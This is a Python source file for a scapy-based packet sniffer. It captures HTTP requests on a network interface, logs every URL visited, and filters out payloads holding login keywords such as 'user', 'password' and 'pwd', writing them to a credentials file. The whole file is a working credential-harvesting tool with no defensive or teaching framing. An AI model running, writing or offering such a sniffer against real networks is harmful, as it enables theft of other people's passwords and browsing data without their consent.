#! /usr/bin/env python
# packet_sniffer.py - packet sniffer that catches HTTP packets and filters out
# all URLs visited and payloads associated with login information.
# Compatibility: Python 3.x

import scapy.all
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import AsyncSniffer


# TODO: Turn packet_sniffer into a class PacketSniffer. It will solve problems with output communication.
class PacketSniffer:
    pass


def get_url(packet):
    return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode(errors="ignore")


def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load.decode(errors="ignore")
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in load.lower() for keyword in keywords):
            return load


# TODO: store in variable, send variable to main kivy loop.
def write_log_entry(entry):
    with open("data/sniffing_log.txt", "a") as log_file:
        log_file.write(entry + "\n")


def write_credentials_entry(entry):
    with open("data/sniffing_credentials.txt", "a") as log_file:
        log_file.write(entry + "\n")


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        write_log_entry(url)
        login_info = get_login_info(packet)
        if login_info:
            write_log_entry(login_info)
            write_credentials_entry(login_info)


def create_sniffer(interface: str = "eth0") -> AsyncSniffer:
    return AsyncSniffer(iface=interface, store=False, prn=process_sniffed_packet)
